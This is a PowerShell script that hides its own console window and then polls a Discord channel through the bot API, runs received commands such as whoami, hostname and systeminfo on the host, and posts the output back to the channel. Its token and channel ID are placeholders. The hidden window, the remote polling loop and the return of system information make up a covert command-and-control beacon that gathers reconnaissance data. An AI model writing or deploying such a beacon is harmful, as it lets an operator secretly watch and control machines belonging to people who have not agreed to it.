# --- Hide Console Window ---
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
# 0 = Hide, 5 = Show
[Console.Window]::ShowWindow($consolePtr, 0)

# --- Bot Config ---
$botToken = "Add Bot Token"
$channelId = "Add Channel ID"
$baseUrl = "https://discord.com/api/v10"

# --- Headers ---
$headers = @{
    "Authorization" = "Bot $botToken"
    "Content-Type"  = "application/json"
    "User-Agent"    = "DiscordBot (https://discord.com, v0.0.1)"
}

# --- Send message to Discord ---
function Send-DiscordMessage {
    param ([string]$message)
    $body = @{ content = $message } | ConvertTo-Json -Depth 2
    Invoke-RestMethod -Uri "$baseUrl/channels/$channelId/messages" -Method Post -Headers $headers -Body $body | Out-Null
}

# --- Command runner ---
# --- Command runner ---
function Run-Command {
    param([string]$cmd)

    switch ($cmd) {
        "pwd"       { return (Get-Location).ToString() }
        "uptime"    {
            $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
            $uptimeFormatted = (Get-Date) - $uptime
            return ("{0} days {1} hours {2} minutes" -f $uptimeFormatted.Days, $uptimeFormatted.Hours, $uptimeFormatted.Minutes)
        }
        "whoami"    { return (whoami) }
        "hostname"  { return $env:COMPUTERNAME }
        "systeminfo" {
            $info = systeminfo | Out-String
            if ($info.Length -gt 1900) { $info = $info.Substring(0,1900) + "`n...(truncated)" }
            return $info
        }
        default     { return "Unknown command: $cmd" }
    }
}

# --- Main bot loop ---
$lastMessageId = ""
while ($true) 
{
    try 
	{
        $messages = Invoke-RestMethod -Uri "$baseUrl/channels/$channelId/messages?limit=1" -Method Get -Headers $headers
        $latestMessage = $messages[0]

        if ($latestMessage.id -ne $lastMessageId -and $latestMessage.author.bot -ne $true) 
		{
            $lastMessageId = $latestMessage.id
            $cmd = $latestMessage.content.Trim().ToLower()

            $result = Run-Command $cmd
            Send-DiscordMessage -message "`n$result`n";
        }
    }
    catch 
	{
        $errMsg = "Bot Error: " + $_.Exception.Message
        Send-DiscordMessage -message $errMsg
    }
    finally 
	{
        # Always wait before checking again
        Start-Sleep -Seconds 3
    }
}
